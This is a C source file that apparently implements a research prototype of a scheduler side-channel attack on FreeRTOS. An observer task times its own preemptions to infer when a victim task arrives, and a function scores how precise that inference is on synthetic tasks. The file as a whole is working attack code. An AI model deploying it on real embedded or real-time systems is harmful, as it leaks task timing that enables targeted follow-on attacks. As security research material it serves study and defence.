/*
 * ScheduleakAttacker.c
 *
 *  Created on: Sep 11, 2017
 *      Author: cy
 */

#include "ScheduleakAttacker.h"
#include "../LogUtility/AttackerLogUtility.h"
#include "../LogUtility/AppLogUtility.h"
#include "IntermittentInterval.h"
#include "../SyntheticTasks.h"


void prvObserverTask( void *pvParameters );
void initInferenceBase(u32 u32InVictimPeriod);
//void applyObserverTaskExecInterval(u32 u32ExecIntervalBeginTime, u32 u32ExecIntervalEndTime);
//u32 getArrivalTimeInference(void);
void initCapturedExecIntervals(void);
void addAnExecInterval(u32 begin, u32 end);

void createAttackerTasks(void) {
	xTaskCreate( prvObserverTask,			/* The function that implements the task. */
					"ObserverTask", 			/* The text name assigned to the task - for debug only as it is not used by the kernel. */
					1000, 				/* The size of the stack to allocate to the task. */
					NULL, 				/* The parameter passed to the task - not used in this case. */
					tskIDLE_PRIORITY+1, 	/* The priority assigned to the task. */
					NULL );
}

extern TickType_t firstTickCount;
extern TaskParam appTaskParamArray[];	// from SyntheticTasks.c
CapturedExecIntervals capturedExecIntervals;
void prvObserverTask( void *pvParameters )
{
	// Initialize attacker's inference base.
	initInferenceBase(appTaskParamArray[0].periodUs*333);
	initCapturedExecIntervals();

	// Initialize the xLastWakeTime variable with the current time.
	TickType_t xLastWakeTime;

	xLastWakeTime = xTaskGetTickCount();
	// To align the start point of every application task.
	if (firstTickCount == 0)
	{
		firstTickCount = xLastWakeTime;
	}
	else
	{
		xLastWakeTime = firstTickCount;
	}


	u32 u32ObserveBeginTime;
	u32 u32ObserveEndTime;
	//u32 u32TempLowHackerTimer;
	u32 u32ObserveTimeDiff;

	u32 u32CurrentExecIntervalBeginTime;
	u32 u32CurrentExecIntervalEndTime;

	//u32 u32HackerQueueData = 0;


	while (1) {
		feedAppLog(getTaskId(), 0, "BEGIN");


		u32ObserveBeginTime = GET_GTIMER_LOWER;
		u32CurrentExecIntervalBeginTime = u32ObserveBeginTime;

		int i;
		for (i=0; i<100000; i++) {	//100000 = 5.7ms
			u32ObserveEndTime = GET_GTIMER_LOWER;

			if (u32ObserveEndTime >= u32ObserveBeginTime){
				u32ObserveTimeDiff = u32ObserveEndTime - u32ObserveBeginTime;
			} else {
				u32ObserveTimeDiff = ((u32)(-1)) - u32ObserveBeginTime + u32ObserveEndTime;
			}

			/* If measured period is bigger than 1ms (this loop overhead is 218 counts), then it is a legitimate hacking period. */
			if (u32ObserveTimeDiff >= 500)
			{
				// Close the interval.
				u32CurrentExecIntervalEndTime = u32ObserveBeginTime;

				// Update the inference intervals.
				//applyObserverTaskExecInterval(u32CurrentExecIntervalBeginTime, u32CurrentExecIntervalEndTime);
				//u32 inferenceResult = getArrivalTimeInference();
				addAnExecInterval(u32CurrentExecIntervalBeginTime, u32CurrentExecIntervalEndTime);

				// Set begin time for the next execution interval.
				u32CurrentExecIntervalBeginTime = u32ObserveEndTime;

				// Inform high hacker task
//				u32HackerQueueData = u32ObserveTimeDiff;
//				if ( xQueueSend( hackerQueue, &u32HackerQueueData, ( TickType_t ) 0 ))	// Send the value to queue.
//				{
//					u32ObserveBeginTime = u32ObserveEndTime;
//				}
//				else
//				{
//					u32ObserveBeginTime = u32ObserveEndTime;
//				}

				//feedAttackerLog(getTaskId(), inferenceResult*3, "PRREMPT-INFERENCE");
			}

			u32ObserveBeginTime = u32ObserveEndTime;

		}

		// Close the last execution interval.
		u32CurrentExecIntervalEndTime = u32ObserveBeginTime;

		// Update the inference intervals.
		//feedAppLog(getTaskId(), 0, "Attacker-CheckPoint1");
		//applyObserverTaskExecInterval(u32CurrentExecIntervalBeginTime, u32CurrentExecIntervalEndTime);
		//feedAppLog(getTaskId(), 0, "Attacker-CheckPoint2");
		//u32 inferenceResult = getArrivalTimeInference();
		//feedAppLog(getTaskId(), 0, "Attacker-CheckPoint3");

		addAnExecInterval(u32CurrentExecIntervalBeginTime, u32CurrentExecIntervalEndTime);


		//feedAttackerLog(getTaskId(), inferenceResult*3, "INFERENCE");

		//feedAppLog(getTaskId(), 0, "END");

		vTaskDelayUntil( &xLastWakeTime, OBSERVER_TASK_PERIOD_US/1000/portTICK_RATE_MS );
	}
}

IntermittentInterval inferenceBase;
u32 u32VictimPeriod;
void initInferenceBase(u32 u32InVictimPeriod) {
	initInterInterval( &inferenceBase, 0, u32InVictimPeriod );
	u32VictimPeriod = u32InVictimPeriod;
}

// cost: 1500ns ~ 2000ns
void applyObserverTaskExecInterval(u32 u32ExecIntervalBeginTime, u32 u32ExecIntervalEndTime) {
	// update the intervals
	Interval thisInterval;
	initInterval( &thisInterval, u32ExecIntervalBeginTime, u32ExecIntervalEndTime );

	//TODO: Check if shifting is correct here.
	shiftInterval( &thisInterval, -(u32)((u32)u32ExecIntervalBeginTime/(u32)u32VictimPeriod)*(u32)u32VictimPeriod );

	Interval wholeBaseInterval;
	initInterval(&wholeBaseInterval, 0, u32VictimPeriod);

	// first period part.
	Interval intervalFirstPeriodPart;
	getIntersection( &wholeBaseInterval, &thisInterval, &intervalFirstPeriodPart );
	InterInterval_updateUnion( &inferenceBase, &intervalFirstPeriodPart);

	// second period part.
	Interval intervalSecondPeriodPart;
	shiftInterval( &thisInterval, -u32VictimPeriod );
	if ( getIntersection( &wholeBaseInterval, &thisInterval, &intervalSecondPeriodPart ) == TRUE ) {
		InterInterval_updateUnion( &inferenceBase, &intervalSecondPeriodPart);
	}

}


// cost: 1300 ns
u32 getArrivalTimeInference(void) {
	// Get complementary intervals, for each interval find the largest one and return the begin time.
	Interval largestComplInterval;
	InterInterval_getLargestComplementaryInterval(&inferenceBase, &largestComplInterval, TRUE);
	return largestComplInterval.begin;
}

void initCapturedExecIntervals(void) {
	capturedExecIntervals.count = 0;
}

void addAnExecInterval(u32 begin, u32 end) {
	Interval *newInterval;
	newInterval = &(capturedExecIntervals.intervals[capturedExecIntervals.count]);
	initInterval(newInterval, begin, end);

	// If the buffer is full, then don't add the counter (next time it will override the latest one).
	if (capturedExecIntervals.count+1 < MAX_CAPTURED_EXEC_INTERVAL_LIST_SIZE) {
		capturedExecIntervals.count ++;
	}
}

double computeInferencePrecisionRatio(u32 victimPeriod, u32 groundTruth, u32 inference) {

	u32 error = abs(groundTruth - inference);
	double precisionRatio;

	if (error > (victimPeriod/2)) {
		error = victimPeriod-error;
	}

	precisionRatio = 1 - ((double)error/(double)(victimPeriod/2));

	return precisionRatio;
}
